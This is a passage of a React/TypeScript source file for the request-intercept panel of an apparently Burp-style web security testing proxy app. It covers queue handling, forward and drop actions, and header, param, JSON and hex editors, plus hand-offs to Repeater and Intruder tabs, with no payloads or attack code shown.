      await invoke('proxy_toggle_response_intercept', { enabled: next });
      setResponseInterceptOn(next);
    } catch (e) {
      notifyError('Response intercept toggle failed', e);
    }
  }, [responseInterceptOn]);

  const forward = useCallback(async () => {
    if (!current) return;
    try {
      const { invoke } = await import('@tauri-apps/api/core');
      const result = await invoke<any>('proxy_intercept_forward', { id: current.id, modifiedRequest: editedRaw });
      const forwarded = { ...current, raw: editedRaw };
      if (result && typeof result === 'object' && result.response) {
        setResponseRaw(result.response);
        forwarded.rawResponse = result.response;
        forwarded.status = result.status;
      } else if (result && typeof result === 'string') {
        setResponseRaw(result);
        forwarded.rawResponse = result;
      }
      setLastForwarded(forwarded);
      setCurrent(null);
    } catch (e) {
      notifyError('Forward failed', e);
    }
  }, [current, editedRaw]);

  const drop = useCallback(async () => {
    if (!current) return;
    try {
      const { invoke } = await import('@tauri-apps/api/core');
      await invoke('proxy_intercept_drop', { id: current.id });
      setCurrent(null);
    } catch (e) {
      notifyError('Drop failed', e);
    }
  }, [current]);

  const forwardAll = useCallback(async () => {
    try {
      const { invoke } = await import('@tauri-apps/api/core');
      for (const req of queue) { await invoke('proxy_intercept_forward', { id: req.id, modifiedRequest: null }); }
      setQueue([]); setCurrent(null);
    } catch {}
  }, [queue]);

  const dropAll = useCallback(async () => {
    try {
      const { invoke } = await import('@tauri-apps/api/core');
      for (const req of queue) { await invoke('proxy_intercept_drop', { id: req.id }); }
      setQueue([]); setCurrent(null);
    } catch {}
  }, [queue]);

  const copyUrl = () => { if (current) navigator.clipboard.writeText(current.url); };
  const copyRaw = () => { navigator.clipboard.writeText(editedRaw); };

  const handleContextMenu = (e: React.MouseEvent, item: QueuedRequest) => {
    e.preventDefault();
    openContextMenu(e.clientX, e.clientY, {
      method: item.method,
      url: item.url,
      requestRaw: item.raw,
      responseRaw: item.rawResponse,
      source: 'intercept',
      onDelete: () => setQueue(q => q.filter(r => r.id !== item.id)),
    });
  };

  const updateHeader = (idx: number, field: 'key' | 'value', val: string) => {
    const copy = [...editedHeaders];
    copy[idx] = { ...copy[idx], [field]: val };
    setEditedHeaders(copy);
    rebuildRawFromHeaders(copy);
  };

  const removeHeader = (idx: number) => {
    const copy = editedHeaders.filter((_, i) => i !== idx);
    setEditedHeaders(copy);
    rebuildRawFromHeaders(copy);
  };

  const addHeader = () => {
    const copy = [...editedHeaders, { key: '', value: '' }];
    setEditedHeaders(copy);
  };

  const mc = (m: string) => {
    const c: Record<string, string> = { GET: 'var(--method-get)', POST: 'var(--method-post)', PUT: 'var(--method-put)', DELETE: 'var(--method-delete)', PATCH: 'var(--accent)' };
    return c[m] || 'var(--text-1)';
  };

  return (
    <div className="intercept">

      <div className="intercept-toolbar">
        <button className={`intercept-toggle ${interceptOn ? 'on' : 'off'}`} onClick={toggleIntercept}>
          {interceptOn ? <Pause size={12} /> : <Play size={12} />}
          {interceptOn ? 'Intercept On' : 'Intercept Off'}
        </button>

        <div className="intercept-toolbar-divider" />

        <button className="intercept-action forward" disabled={!current} onClick={forward} title="Forward request (possibly modified)">
          <ArrowRight size={12} /> Forward
        </button>
        <button className="intercept-action drop" disabled={!current} onClick={drop} title="Drop this request">
          <X size={12} /> Drop
        </button>

        {queue.length > 1 && <>
          <div className="intercept-toolbar-divider" />
          <button className="intercept-action forward" onClick={forwardAll} title="Forward all queued requests">
            <ArrowRight size={12} /> Forward All ({queue.length})
          </button>
          <button className="intercept-action drop" onClick={dropAll} title="Drop all queued requests">
            <X size={12} /> Drop All
          </button>
        </>}

        <div className="intercept-spacer" />


        <button className={`intercept-resp-toggle ${responseInterceptOn ? 'on' : ''}`} onClick={toggleResponseIntercept} title="Toggle response interception">
          {responseInterceptOn ? <ToggleRight size={14} /> : <ToggleLeft size={14} />}
          <span>Resp</span>
        </button>

        <div className="intercept-toolbar-divider" />


        {current && <>
          <button className="intercept-action-mini" onClick={copyUrl} title="Copy URL"><Copy size={11} /></button>
          <button className="intercept-action-mini" onClick={copyRaw} title="Copy raw request"><FileText size={11} /></button>
        </>}

        <div className="intercept-toolbar-divider" />

        {!proxyRunning ? (
          <button className="intercept-proxy-btn" onClick={startProxy}><Zap size={12} /> Start Proxy</button>
        ) : (
          <button className="intercept-proxy-btn stop" onClick={stopProxy}><Zap size={12} /> Stop Proxy</button>
        )}

        <button className="intercept-proxy-btn browser" onClick={async () => {
          try {
            const { invoke } = await import('@tauri-apps/api/core');
            if (!proxyRunning) await invoke('proxy_start', { port: 8080 });
            const preferSystem = localStorage.getItem('ws_prefer_system_browser') === '1';
            const noSandbox = localStorage.getItem('ws_browser_no_sandbox') === '1';
            await invoke('browser_launch', {
              browserName: null,
              proxyPort: 8080,
              preferSystemBrowser: preferSystem,
              noSandbox,
            });
          } catch (e) { console.error(e); alert(e); }
        }}>
          <Globe size={12} /> WonderBrowser
        </button>

        <div className="intercept-status">
          <div className={`intercept-status-dot ${proxyRunning ? (interceptOn ? 'active' : 'running') : 'idle'}`} />
          {proxyRunning ? interceptOn ? `${queue.length} queued · ${totalRequests} total` : `Running · ${totalRequests} req` : 'Proxy off'}
        </div>
      </div>


      <div className="intercept-body">
        <div className="intercept-editor">
          {(current || lastForwarded) ? (() => {
            const displayItem = current || lastForwarded!;
            const isForwarded = !current && !!lastForwarded;
            return (
            <>

              <div className="intercept-info-bar">
                <span className="intercept-info-method" style={{ color: mc(displayItem.method) }}>{displayItem.method}</span>
                <span className="intercept-info-url">{displayItem.url}</span>
                {isForwarded && <span className="intercept-forwarded-badge">Forwarded</span>}
                {displayItem.isResponse && <span className="intercept-info-badge resp">RESPONSE {displayItem.status}</span>}
                {!displayItem.isResponse && !isForwarded && <span className="intercept-info-badge req">REQUEST</span>}
              </div>


              <div className="intercept-editor-tabs">
                {(() => {
                  const { idx: hdrEnd, sepLen } = findHeaderEnd(editedRaw);
                  const bodyForDetect = hdrEnd === -1 ? '' : editedRaw.slice(hdrEnd + sepLen);
                  const hasJsonBody = looksLikeJson(bodyForDetect);
                  const tabs = [
                    { id: 'raw', label: 'Raw', icon: <Code size={11} /> },
                    { id: 'headers', label: 'Headers', icon: <FileText size={11} /> },
                    { id: 'params', label: 'Params', icon: <Hash size={11} /> },
                    ...(hasJsonBody ? [{ id: 'json' as const, label: 'JSON', icon: <Layers size={11} /> }] : []),
                    { id: 'hex', label: 'Hex', icon: <Eye size={11} /> },
                    { id: 'attack', label: 'Attacks', icon: <Zap size={11} /> },
                    { id: 'response', label: 'Response', icon: <Eye size={11} /> },
                  ] as const;
                  return tabs.map((t) => (
                    <button key={t.id} className={`intercept-editor-tab ${editorTab === t.id ? 'active' : ''}`} onClick={() => setEditorTab(t.id)}>
                      {t.icon} {t.label}
                      {t.id === 'headers' && <span className="intercept-tab-count">{editedHeaders.length}</span>}
                      {t.id === 'params' && <span className="intercept-tab-count">{editedParams.length}</span>}
                      {t.id === 'json' && <span className="intercept-tab-count json">JSON</span>}
                      {t.id === 'attack' && Object.values(detectedAttacks).filter(Boolean).length > 0 && <span className="intercept-tab-count detected">{Object.values(detectedAttacks).filter(Boolean).length}</span>}
                      {t.id === 'response' && (responseRaw || displayItem.rawResponse) && <span className="intercept-tab-count">1</span>}
                    </button>
                  ));
                })()}
              </div>

              {editorTab === 'raw' && (
                <div className="intercept-editor-layer-wrap">
                  <pre className="intercept-highlighter" ref={preRef} aria-hidden="true">
                    {highlightHttp(editedRaw)}
                  </pre>
                  <textarea 
                    className="intercept-textarea" 
                    value={editedRaw} 
                    onChange={(e) => { 
                      setEditedRaw(e.target.value); 
                      setEditedHeaders(parseHeaders(e.target.value)); 
                    }}
                    onScroll={(e) => {
                      if (preRef.current) {
                        preRef.current.scrollTop = e.currentTarget.scrollTop;
                        preRef.current.scrollLeft = e.currentTarget.scrollLeft;
                      }
                    }}
                    spellCheck={false} 
                  />
                </div>
              )}

              {editorTab === 'attack' && (
                <AttackTablePanel
                  editedRaw={editedRaw}
                  setEditedRaw={setEditedRaw}
                  setEditedHeaders={(r: string) => setEditedHeaders(parseHeaders(r))}
                  setEditorTab={setEditorTab}
                  attackConfig={attackConfig}
                  setAttackConfig={setAttackConfig}
                  detectedAttacks={detectedAttacks}
                  addToast={addToast}
                  categoryFilter={attackCategoryFilter}
                  setCategoryFilter={setAttackCategoryFilter}
                  expandedAttack={expandedAttack}
                  setExpandedAttack={setExpandedAttack}
                  autoScanRunning={autoScanRunning}
                  setAutoScanRunning={setAutoScanRunning}
                  scanResults={scanResults}
                  setScanResults={setScanResults}
                  currentUrl={displayItem.url || ''}
                />
              )}

              {editorTab === 'response' && (
                <div className="intercept-response-viewer">
                  {(responseRaw || displayItem.rawResponse) ? (
                    <>
                      <div className="intercept-response-header">
                        <Eye size={14} /> Response
                        {displayItem.status && <span className={`intercept-response-status ${(displayItem.status >= 200 && displayItem.status < 300) ? 'ok' : (displayItem.status >= 400) ? 'err' : ''}`}>{displayItem.status}</span>}
                        <span className="intercept-response-size">{(responseRaw || displayItem.rawResponse || '').length} bytes</span>
                        <button className="intercept-action-mini" onClick={() => navigator.clipboard.writeText(responseRaw || displayItem.rawResponse || '')} title="Copy response"><Copy size={11} /></button>
                        <button className="intercept-action-mini" onClick={() => {
                          const { sendTo } = useAppStore.getState();
                          sendTo('repeater', displayItem.method || 'GET', displayItem.url || '', editedRaw, responseRaw || displayItem.rawResponse || '');
                          addToast({ title: 'Sent', message: 'Request + Response sent to Repeater.', type: 'success' });
                        }} title="Send to Repeater"><ArrowRight size={11} /> Repeater</button>
                        <button className="intercept-action-mini" onClick={() => {
                          const { sendTo } = useAppStore.getState();
                          sendTo('intruder', displayItem.method || 'GET', displayItem.url || '', editedRaw, responseRaw || displayItem.rawResponse || '');
                          addToast({ title: 'Sent', message: 'Sent to Intruder.', type: 'success' });
                        }} title="Send to Intruder"><Zap size={11} /> Intruder</button>
                      </div>
                      <pre className="intercept-response-body">{highlightHttp(responseRaw || displayItem.rawResponse || '')}</pre>
                    </>
                  ) : (
                    <div className="intercept-empty-tab">
                      <Eye size={24} />
                      <span>No response captured yet</span>
                      <span className="intercept-empty-sub">Forward the request first — the response will appear here automatically.<br/>Tip: Enable Response Intercept to capture responses for every request.</span>
                    </div>
                  )}
                </div>
              )}

              {editorTab === 'headers' && (
                <div className="intercept-table-wrap">
                  <table className="intercept-table">
                    <thead><tr><th>Header</th><th>Value</th><th></th></tr></thead>
                    <tbody>
                      {editedHeaders.map((h, i) => (
                        <tr key={i}>
                          <td><input className="intercept-table-input" value={h.key} onChange={e => updateHeader(i, 'key', e.target.value)} /></td>
                          <td><input className="intercept-table-input" value={h.value} onChange={e => updateHeader(i, 'value', e.target.value)} /></td>
                          <td><button className="intercept-table-del" onClick={() => removeHeader(i)}>×</button></td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                  <button className="intercept-table-add" onClick={addHeader}>+ Add Header</button>
                </div>
              )}

              {editorTab === 'params' && (
                <div className="intercept-table-wrap">
                  {editedParams.length === 0 ? (
                    <div className="intercept-empty-tab">No parameters found in this request</div>
                  ) : (
                    <table className="intercept-table">
                      <thead><tr><th>Source</th><th>Name</th><th>Value</th></tr></thead>
                      <tbody>
                        {editedParams.map((p, i) => (
                          <tr key={i}>
                            <td><span className={`intercept-param-source ${p.source}`}>{p.source}</span></td>
                            <td><span className="intercept-param-name">{p.key}</span></td>
                            <td><input className="intercept-table-input" defaultValue={p.value} /></td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  )}
                </div>
              )}

              {editorTab === 'json' && (
                <JsonBodyEditor
                  editedRaw={editedRaw}
                  setEditedRaw={setEditedRaw}
                  setEditedHeaders={(r: string) => setEditedHeaders(parseHeaders(r))}
                  addToast={addToast}
                />
              )}

              {editorTab === 'hex' && (
                <pre className="intercept-hex">{toHex(editedRaw)}</pre>
              )}
            </>
            );
          })() : (
            <div className="intercept-empty">
              <Shield size={32} />
              <span>{interceptOn ? 'Waiting for request...' : 'Intercept is off'}</span>
              {!proxyRunning && <span className="intercept-empty-sub">Configure your browser to use proxy 127.0.0.1:8080</span>}
            </div>
          )}
        </div>


        <div className="intercept-queue">
          <div className="intercept-queue-header">Queue ({queue.length})</div>
          <div className="intercept-queue-list">
            {queue.length === 0 ? (
              <div style={{ padding: '20px 12px', textAlign: 'center', color: 'var(--text-3)', fontSize: 11, lineHeight: 1.5 }}>
                {interceptOn
                  ? 'Queue is empty. Trigger a request in the browser — it will appear here for editing.'
                  : 'Intercept is off. Toggle it on to capture requests for editing.'}
              </div>
            ) : queue.map((req) => (
              <div key={req.id}
                className={`intercept-queue-item ${current?.id === req.id ? 'active' : ''}`}
                onClick={() => selectItem(req)}
                onContextMenu={(e) => handleContextMenu(e, req)}
              >
                <div className="intercept-queue-method" style={{ color: mc(req.method) }}>{req.method}</div>
                <div className="intercept-queue-url">{req.host}{new URL(req.url.startsWith('http') ? req.url : 'http://x' + req.url).pathname}</div>
                {req.isResponse && <span className="intercept-queue-badge">RESP</span>}
              </div>
            ))}
          </div>
        </div>
      </div>


    </div>
  );
}
